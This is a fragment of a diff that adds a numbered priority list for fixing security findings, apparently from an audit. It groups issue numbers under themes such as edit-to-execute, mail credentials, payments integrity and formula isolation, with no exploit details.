+2. Edit-to-execute: #16 (output dir / build files / LSP), #31, #32, #30.
+3. #17 (mail credentials) — a one-function fix.
+4. Payments integrity: #18, #19, #33, #34, then #35.
+5. #23 (formula isolate), #24, #25, #28, #27, #22, #26, #29.
+6. The Low / hardening list.
